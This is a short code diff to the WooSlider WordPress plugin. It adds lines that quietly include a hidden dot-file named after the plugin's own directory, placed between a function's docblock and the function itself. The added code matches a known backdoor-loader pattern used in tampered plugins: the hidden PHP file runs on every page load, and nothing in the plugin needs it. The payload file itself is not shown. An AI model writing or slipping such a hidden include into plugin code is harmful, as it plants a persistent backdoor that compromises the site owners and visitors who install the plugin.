@@ -17,6 +17,10 @@ if ( ! function_exists( 'wooslider' ) ) {
  * @param  boolean $echo 	Whether or not to echo the slider output (default: true)
  * @return string/void      Returns a string of $echo is false. Otherwise, returns void.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wooslider ( $args = array(), $extra_args = array(), $echo = true ) {
 	global $wooslider;
 
